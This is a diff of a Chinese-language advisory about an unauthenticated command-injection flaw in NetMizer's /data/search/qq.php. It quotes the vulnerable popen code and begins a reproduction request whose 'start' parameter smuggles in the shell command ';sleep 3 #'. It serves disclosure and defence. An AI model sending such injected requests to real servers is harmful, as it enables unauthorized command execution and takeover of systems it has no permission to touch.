@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/qq.php` 文件存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
+NetMizer日志[管理系统](#)是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志[数据](#)。然而，该系统中的 `/data/search/qq.php` 文件存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
 
-短信和即时消息
+管理
 
 # 影响版本
 
@@ -74,21 +74,13 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
                 $fp = @popen($cmd,"r");
 ```
 
-深入探索
-
-网络安全
-
-编程
-
-网站托管与域名注册
-
 用户可控参数直接拼接进系统命令字符串 `$cmd` 中，并通过 `popen($cmd, "r")` 执行。参数如 `$nodeid`、`$srcid`、`$user`、`$qq` 和 `$start` 来自用户输入，未经过任何过滤或转义。这些参数在命令构建过程中直接插入，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-软件
+字典与百科全书
 
 ```
 GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
